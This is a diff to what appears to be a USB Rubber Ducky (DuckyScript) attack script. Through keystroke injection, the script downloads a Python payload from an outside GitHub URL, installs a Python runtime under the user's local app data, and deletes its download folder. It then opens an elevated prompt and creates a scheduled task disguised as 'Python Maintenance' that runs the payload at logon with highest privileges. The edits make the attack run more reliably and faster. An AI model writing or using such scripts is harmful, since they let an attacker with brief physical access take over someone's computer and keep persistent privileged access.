@@ -72,8 +72,8 @@ STRINGLN curl -q -s --create-dirs --output-dir %localappdata%\Temp\py\ -o tmp.zi
 
 REM Download main payload
 RUN()
-STRING curl -q -s --output-dir %localappdata%\python1 -o python-manager.py https://raw.githubusercontent.com/x-9917638/HackyDucky/refs/heads/main/payload.py
-DELAY 30000
+STRINGLN curl -q -s --output-dir %localappdata%\python1 -o python-manager.py https://raw.githubusercontent.com/x-9917638/HackyDucky/refs/heads/main/payload.py
+DELAY 5000
 
 REM Unzip python
 RUN()
@@ -81,11 +81,11 @@ STRINGLN cmd /c "cd %localappdata% && mkdir python1 > nul & tar -xf Temp\py\tmp.
 
 REM remove python download dir to avoid pollution
 RUN()
-STRING rmdir /s /q %localappdata%\Temp\py\
+STRINGLN rmdir /s /q %localappdata%\Temp\py\
 
 
 
-REM Open elevated cmd prompt
+REM Open elevated cmd prompt - assumes default uac level
 GUI r
 DELAY 500
 STRING cmd
@@ -95,10 +95,10 @@ RIGHT
 ENTER
 
 REM Add task for startup run as admin
-STRING schtasks /Create /TN "Python Maintenance" /TR "\"%localappdata%\python1\python.exe\" \"%localappdata%\python1\python-manager.py\"" /SC ONLOGON /RL HIGHEST /F
+STRINGLN schtasks /Create /TN "Python Maintenance" /TR "\"%localappdata%\python1\python.exe\" \"%localappdata%\python1\python-manager.py\"" /SC ONLOGON /RL HIGHEST /F
 
 REM Run main payload
-%localappdata%\python1\python.exe %localappdata%\python1\python-manager.py
+STRINGLN start /b %localappdata%\python1\python.exe %localappdata%\python1\python-manager.py
 
 REM Close cmd.exe
 ALT F4
